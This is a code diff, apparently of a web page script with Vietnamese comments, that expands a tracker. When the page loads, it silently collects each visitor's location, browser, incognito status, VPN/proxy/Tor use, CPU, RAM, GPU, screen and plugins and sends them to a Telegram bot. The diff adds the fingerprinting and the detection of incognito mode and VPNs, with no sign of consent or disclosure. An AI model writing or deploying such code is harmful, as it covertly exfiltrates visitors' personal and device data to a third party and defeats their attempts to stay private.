@@ -3,21 +3,74 @@ const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn
 
 
 
-// Lấy thông tin trình duyệt & thiết bị
-function getDeviceFingerprint() {
+// 📌 Lấy tên trình duyệt chính xác
+function getBrowserName() {
+    let userAgent = navigator.userAgent;
+
+    if (navigator.brave && (navigator.brave.isBrave || navigator.brave.isBraveSyncEnabled)) return "Brave";
+    if (userAgent.includes("Edg/")) return "Microsoft Edge";
+    if (userAgent.includes("OPR/") || userAgent.includes("Opera")) return "Opera";
+    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
+    if (userAgent.includes("coc_coc_browser")) return "Cốc Cốc";
+    if (userAgent.includes("Chrome")) return "Google Chrome";
+    if (userAgent.includes("Safari")) return "Safari";
+    if (userAgent.includes("Trident/") || userAgent.includes("MSIE")) return "Internet Explorer";
+
+    return "Không xác định";
+}
+
+// 📌 Kiểm tra chế độ ẩn danh
+async function isIncognito() {
+    return new Promise((resolve) => {
+        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if (!fs) resolve(false);
+        else {
+            fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+        }
+    });
+}
+
+// 📌 Kiểm tra có dùng VPN/Proxy không
+async function isUsingProxyOrVPN() {
+    try {
+        let response = await fetch("https://api64.ipify.org?format=json");
+        let data = await response.json();
+        let ip = data.ip;
+
+        let checkResponse = await fetch(`https://vpnapi.io/api/${ip}?key=free`);
+        let checkData = await checkResponse.json();
+
+        return checkData.security.vpn || checkData.security.proxy || checkData.security.tor;
+    } catch (error) {
+        return "Không xác định";
+    }
+}
+
+// 📌 Lấy thông tin thiết bị
+async function getDeviceFingerprint() {
+    let canvas = document.createElement("canvas");
+    let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    let debugInfo = gl ? gl.getExtension("WEBGL_debug_renderer_info") : null;
+
     return {
-        platform: navigator.platform, // Hệ điều hành
-        language: navigator.language, // Ngôn ngữ trình duyệt
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // Múi giờ
-        screenResolution: `${screen.width}x${screen.height}`, // Độ phân giải màn hình
-        colorDepth: screen.colorDepth, // Độ sâu màu
-        plugins: Array.from(navigator.plugins).map(p => p.name).join(", "), // Plugin trình duyệt
+        browser: getBrowserName(),
+        incognito: await isIncognito(),
+        vpnProxy: await isUsingProxyOrVPN(),
+        platform: navigator.platform,
+        cpuCores: navigator.hardwareConcurrency || "Không xác định",
+        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Không xác định",
+        gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Không xác định",
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screenResolution: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        plugins: Array.from(navigator.plugins).map(p => p.name).join(", "),
     };
 }
 
-// Hàm lấy vị trí & gửi đến Telegram
+// 📌 Lấy vị trí & gửi lên Telegram
 async function sendInfoToTelegram() {
-    const fingerprint = getDeviceFingerprint();
+    const fingerprint = await getDeviceFingerprint();
     let city = "Không xác định";
     let region = "Không xác định";
     let country = "Không xác định";
@@ -66,13 +119,18 @@ async function sendInfoToTelegram() {
 🏛️ Tỉnh/Bang: ${region}
 🌏 Quốc gia: ${country}
 
+🖥️ **THÔNG TIN HỆ THỐNG**
+🌐 Trình duyệt: ${fingerprint.browser}
+🕵️ Ẩn danh: ${fingerprint.incognito ? "Có" : "Không"}
+🔒 VPN/Proxy: ${fingerprint.vpnProxy ? "Có" : "Không"}
 💻 Hệ điều hành: ${fingerprint.platform}
-🌐 Ngôn ngữ trình duyệt: ${fingerprint.language}
-🕰️ Múi giờ: ${fingerprint.timezone}
+🧠 CPU: ${fingerprint.cpuCores} lõi
+🎮 GPU: ${fingerprint.gpu}
+🛠️ RAM: ${fingerprint.ram}
 🖥️ Độ phân giải màn hình: ${fingerprint.screenResolution}
 🎨 Độ sâu màu: ${fingerprint.colorDepth}
 🔌 Plugin trình duyệt: ${fingerprint.plugins}
-    `;
+`;
 
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     fetch(telegramUrl, {
@@ -86,6 +144,5 @@ async function sendInfoToTelegram() {
     });
 }
 
-// Gọi hàm khi trang tải
+// 📌 Gọi hàm khi trang tải
 sendInfoToTelegram();
-
